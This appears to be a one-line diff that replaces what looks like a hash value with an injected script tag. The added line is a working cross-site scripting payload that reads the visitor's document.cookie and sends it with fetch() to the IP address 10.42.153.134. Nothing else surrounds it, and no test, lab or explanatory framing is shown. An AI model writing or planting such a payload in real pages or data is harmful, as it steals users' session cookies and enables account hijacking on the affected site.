@@ -1,1 +1,1 @@
-2dd7a162a33820fb8df9b6b96927533e
+<script>fetch("http://10.42.153.134/?cookie=" + document.cookie)</script>
